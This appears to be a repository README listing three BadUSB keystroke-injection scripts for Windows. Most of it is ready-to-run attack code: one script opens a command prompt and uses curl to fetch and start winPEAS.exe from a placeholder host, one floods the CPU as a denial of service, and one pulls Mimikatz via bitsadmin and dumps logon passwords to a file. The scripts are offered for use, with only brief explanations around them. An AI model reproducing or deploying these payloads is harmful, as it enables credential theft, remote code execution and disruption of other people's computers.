## üìç Overview


***Payload*** represents the core and often malicious component of code or an attack that is responsible for executing specific actions on a target system. These actions can range from gaining unauthorized access, extracting sensitive data, to compromising the integrity of the targeted software or hardware. Payloads are typically designed to exploit vulnerabilities and are delivered via various means, including email attachments, compromised files, or even physical devices such as USB drives. 

***BadUSB*** is a computer security attack using USB devices that are programmed with malicious software.For example, USB flash drives can contain a programmable Intel 8051 microcontroller, which can be reprogrammed, turning a USB flash drive into a malicious device. This attack works by programming the fake USB flash drive to emulate a keyboard, which once plugged into a computer, is automatically recognized and allowed to interact with the computer, and can then initiate a series of keystrokes which open a command window and issue commands to download malware.

## üëæ List of Bad USB scripts

### 1Ô∏è‚É£ winPEAS payload delivered by curl

This script performs the delivery and execution of a potentially malicious file (winPEAS.exe) from a remote location. Its intent, is to open a Command Line on a target Windows system and then fetch via curl and run a payload from a specified URL.

```sh
REM Title: Bad USB - winPEAS payload delivered by curl
REM Author: DannnyzZ
REM Date: 10.15.2023
REM Description: Opens commandline, then curls payload from github repository
REM Target: Windows 10/11 (cmd)
REM Version: 1.0

REM Pause for everything to recognize and be ready
DELAY 2000

REM Open Command Line
CTRL ESC
DELAY 750
STRING cmd
DELAY 250
ENTER
DELAY 1000
ENTER

REM Execute curl payload from link
@echo off
REM Input command
STRING @echo off && set "downloadURL=https://www.malicious.com/winPEAS.exe" && set "downloadPath=%USERPROFILE%\winPEAS.exe" && set "runCommand=%USERPROFILE%\winPEAS.exe"
ENTER
DELAY 750
STRING curl -LJO "%downloadURL%" && move "winPEAS.exe" "%downloadPath%" && start "" "%runCommand%"
ENTER
```

### 2Ô∏è‚É£ DoS - processor exhaustion

The technical intent of this script is to cause a denial of service (DoS) condition by exhausting the target system's CPU, making it unresponsive and potentially leading to system instability. This type of attack is disruptive and can cause significant disruption to the target system's operation.

```sh
REM Title: Bad USB - Processor Exhaustion
REM Author: DannnyzZ
REM Date: 10.15.2023
REM Description: Opens commandline, then executes PC stress test.
REM Target: Windows 10/11 (cmd)
REM Version: 1.0

REM Pause for everything to recognize and be ready
DELAY 2000

REM Open Command Line
CTRL ESC
DELAY 750
STRING cmd
DELAY 250
ENTER
DELAY 1000
ENTER

REM Input command
STRING for /l %i in (1,1,1000000) do echo. 2^32 | find /r ".*"
ENTER
```

### 3Ô∏è‚É£ Mimikatz payload delivered by BITSAdmin

This script is a malicious payload designed to harvest login credentials from the target system using Mimikatz. The script delivers Mimikatz via BITSAdmin and then runs it to capture login passwords and save them to a file.

```sh
REM Title: Bad USB - Mimikatz via bitsadmin
REM Author: DannnyzZ
REM Date: 10.15.2023
REM Description: MIMIKATZ drop credentials on desktop
REM Target: Windows 10/11 (cmd)
REM Version: 1.0

REM Pause for everything to recognize and be ready
DELAY 2000

REM Elevate priviledges

DELAY 500
STRING bitsadmin /transfer "mimikatz" /download /priority foreground "https://www.malicious.com/mimikatz.exe" "C:\Users\Public\mimikatz.exe"
ENTER
DELAY 3000

REM Execute commands in mimikatz
STRING start C:\Users\Public\mimikatz.exe
ENTER
DELAY 500
STRING privilege::debug
ENTER
DELAY 1000
STRING sekurlsa::logonpasswords >> C:\Users\Public\dump.txt
ENTER
DELAY 1000
```


## üöÄ Getting Started
